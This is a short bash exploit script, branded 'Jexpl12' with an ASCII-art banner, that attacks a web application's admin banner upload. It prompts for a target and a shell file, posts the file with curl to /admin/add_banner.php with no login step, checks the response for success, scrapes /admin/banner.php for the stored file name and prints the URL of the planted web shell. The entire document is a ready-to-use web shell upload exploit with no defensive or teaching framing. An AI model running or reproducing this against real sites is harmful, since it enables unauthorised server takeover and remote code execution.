#!/bin/bash

RED="$(printf '\033[1;31m')"  GREEN="$(printf '\033[1;32m')" PURPLE="$(printf '\033[1;35m')" RESAT="$(printf '\033[0m')"
cat << EOF
${PURPLE}    ___   ___   _ ${RED}  _    ${GREEN}  _     _     _
${PURPLE}   | |_) | |_) / |${RED} \ \  /${GREEN} | | | | |   | |\ |
${PURPLE}   |_|   |_| \ |_|${RED}  \_\/ ${GREEN} \_\_/ |_|__ |_| \|  ${RESAT} Jexpl12

EOF

read -p " TARGET: " target
read -p " SHELLL: " shell

if [[ -f $shell ]]; then
    random_title=$(echo "$(tr -dc 'a-zA-Z1-9' < /dev/urandom | head -c 8)")
    upload_shell=$(curl -s -k -F "banner_title=$random_title" -F "sub_title=$random_title" -F "banner_img=@$shell" -F "submit=" "$target/admin/add_banner.php" | grep -o "Data Added Successfully")
            if [[ $upload_shell != "" ]]; then
            get_shell=$(curl -s -k $target/admin/banner.php | grep "$random_title" -i -C 1 | sed -n "3p" | cut -d "'" -f 2)
            echo -e " BINGOO: ${GREEN}$target/admin/${get_shell}${RESAT}"
        else
            echo -e " Hmmm, ${RED}$target${RESAT} wasn't exploitable"
        fi
else
    echo " The shell name that u enter called ${RED}$shell wasn't found${RESAT}, Bro"
fi
